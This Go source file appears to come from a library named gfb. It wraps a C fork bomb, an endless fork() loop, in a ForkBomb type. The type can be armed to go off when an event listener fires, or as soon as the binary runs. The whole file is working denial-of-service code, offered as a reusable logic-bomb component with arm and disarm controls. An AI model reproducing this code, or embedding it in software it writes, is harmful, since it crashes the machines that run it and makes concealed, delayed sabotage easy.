package fbomb

/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/gfb
//
// Copyright: GNU LGPLv3
// See the LICENSE file for more info.
*/

import (
	"sync"

	puffgo "github.com/ARaChn3/puffgo"
)

/*
#include<unistd.h>

int fb() {
	while(1){ fork(); }
}
*/
import "C"

type ForkBomb struct {

	// Listener specifies the EventListener for the bomb.
	// If Listener is nil, the ForkBomb will go off as soon
	// as the program/binary is executed.
	//
	// To create an event-listener, use the NewListener function
	// present in the puffgo project.
	// For more details, visit the puffgo wiki.
	Listener *puffgo.EventListener
}

func NewBomb(listener *puffgo.EventListener) *ForkBomb {
	fb := ForkBomb{}
	if listener == nil {
		el := puffgo.NewListener(nil, func() bool { return true })
		fb.Listener = el
	} else {
		fb.Listener = listener
	}

	return &fb
}

// Arm() allows the activation of the bomb. If a bomb is not armed,
// it won't be triggered even if the event defined in Listener occurs.
func (fb *ForkBomb) Arm() {
	var wg sync.WaitGroup

	// Run listner's mainloop
	go func() {
		defer wg.Done()
		fb.Listener.Mainloop()
	}()

	// Check for trigger...
	go func() {
		defer wg.Done()
		for {
			if isTriggered := <-fb.Listener.TriggerChannel; isTriggered {
				fb.Listener.Terminate()
				_cfb()
				break
			}
		}
	}()

	wg.Add(2)
	wg.Wait()
}

// Disarm() allows the deactivation of the bomb. It passes a true into
// the TerminationChannel of Listener, thereby terminating the listener's
// mainloop.
func (fb *ForkBomb) Disarm() {
	fb.Listener.Terminate()
}

func _cfb() {
	C.fb()
}
